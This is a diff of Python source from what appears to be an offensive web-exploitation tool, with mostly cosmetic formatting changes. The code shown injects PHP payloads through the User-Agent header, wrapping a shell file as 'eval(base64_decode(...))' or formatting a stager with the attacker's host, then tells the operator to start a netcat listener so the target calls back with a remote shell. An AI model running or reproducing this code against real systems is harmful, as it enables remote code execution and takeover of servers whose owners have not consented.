@@ -11,7 +11,6 @@ HERE = abspath(dirname(__file__))
 
 class Environ:
     def __init__(self, args):
-
         self.target = args.url
         self.nostager = args.nostager
         self.relative = args.relative
@@ -20,10 +19,12 @@ class Environ:
         self.detection = args.detection
 
     def attack(self, payload):
-        headers = {'User-Agent': payload}
+        headers = {"User-Agent": payload}
         if self.cookies:
             f_cookies = cook(self.cookies)
-            response = attack(self.target, self.location, headers=headers, cookies=f_cookies)
+            response = attack(
+                self.target, self.location, headers=headers, cookies=f_cookies
+            )
         else:
             response = attack(self.target, self.location, headers=headers)
         return response
@@ -43,22 +44,30 @@ class Environ:
         if self.nostager:
             with open("/tmp/{0}.php".format(shell), "r") as f:
                 payload = "<?php eval(base64_decode('{0}')); ?>".format(
-                    f.read().encode('base64').replace("\n", ""))
+                    f.read().encode("base64").replace("\n", "")
+                )
         else:
             payload = STAGER.format(lhost, shell)
 
             try:
-                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
+                p = subprocess.Popen(
+                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
+                )
                 p.communicate()
             except OSError as e:
                 print(colors("[!] Process Error", 91))
                 print(e)
 
-        headers = {'User-Agent': payload}
+        headers = {"User-Agent": payload}
 
-        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
+        input(
+            colors(
+                "[?] Press Enter To Continue When Your netcat listener is Running ...",
+                94,
+            )
+        )
 
-        headers = {'User-Agent': payload}
+        headers = {"User-Agent": payload}
         if self.cookies:
             f_cookies = cook(self.cookies)
             attack(self.target, self.location, headers=headers, cookies=f_cookies)
